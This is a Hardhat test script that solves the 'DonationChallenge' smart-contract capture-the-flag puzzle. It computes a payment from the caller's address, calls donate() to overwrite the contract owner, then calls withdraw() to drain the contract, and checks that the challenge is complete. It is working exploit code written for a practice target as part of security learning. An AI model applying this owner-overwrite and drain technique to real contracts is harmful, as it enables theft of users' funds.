import { ethers } from "hardhat";
import { expect } from "chai";
import { utils } from "ethers";


describe("donation", function() {
    it("should solve the donation challenge", async function() {
        this.timeout(0);

        const TARGET_ADDR = "0x884D9d2e2a23e48a8048f12E564a7D54F37ffEB7";

        // print balance
        let accounts = await ethers.getSigners();
        let eoa = accounts[0];
        let balance = await eoa.getBalance();
        console.log(ethers.utils.formatEther(balance));
        
        // attach to target contract
        const factory = await ethers.getContractFactory("DonationChallenge");
        const targetCont = factory.attach(TARGET_ADDR);

        // calculate payment amount
        let payval = ethers.BigNumber.from(eoa.address).div(
            ethers.BigNumber.from(10).pow(36)
            );
        
        // overwrite owner
        let tx = await targetCont.donate(eoa.address.toString(), {value: payval, gasLimit: 1e5});
        tx.wait();
        console.log(tx);

        // call withdrawn
        tx = await targetCont.withdraw();
        tx.wait();
        console.log(tx); 
        
        // check isComplete
        let isComplete = await targetCont.isComplete(); 
        expect(isComplete).to.be.true;
    });
});